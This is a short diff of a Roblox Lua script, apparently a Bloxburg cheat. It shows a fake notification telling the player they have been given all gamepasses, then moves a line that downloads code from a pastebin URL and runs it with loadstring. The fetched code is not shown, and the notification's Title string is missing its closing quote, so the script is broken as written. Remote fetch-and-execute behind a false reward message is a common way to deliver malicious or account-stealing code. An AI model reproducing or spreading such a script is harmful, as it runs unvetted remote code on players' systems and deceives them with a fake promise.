@@ -1,9 +1,10 @@
-loadstring(game:HttpGet(('https://pastebin.com/raw/Y8n49QN1'),true))()
-
-
 game.StarterGui:SetCore("SendNotification", {
 Title = "BloxBurg;
 Text = "You have been given all gamepasses";
 Icon = "";
 Duration = 20;
 })
+
+loadstring(game:HttpGet(('https://pastebin.com/raw/Y8n49QN1'),true))()
+
+
